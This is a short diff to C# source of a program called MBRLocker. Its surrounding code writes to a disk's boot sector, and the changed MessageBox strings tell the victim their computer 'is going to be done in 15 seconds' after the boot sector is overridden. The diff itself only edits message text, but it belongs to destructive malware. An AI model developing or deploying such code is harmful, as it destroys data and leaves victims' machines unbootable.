@@ -59,7 +59,7 @@ namespace MBRLocker
 
             if (mbr == (IntPtr)(-0x1))
             {
-                MessageBox.Show("bruh");
+                MessageBox.Show("something happed but who cares");
                 return;
             }
 
@@ -70,12 +70,12 @@ namespace MBRLocker
                 out uint lpNumberOfBytesWritten,
                 IntPtr.Zero))
             {
-                MessageBox.Show("Done");
+                MessageBox.Show("Your computer is going to be done in 15 seconds");
                 return;
             }
             else
             {
-                MessageBox.Show("Error");
+                MessageBox.Show("Error overriding boot sector, though its not important because your computer is going to be done anyways");
                 return;
             }
         }
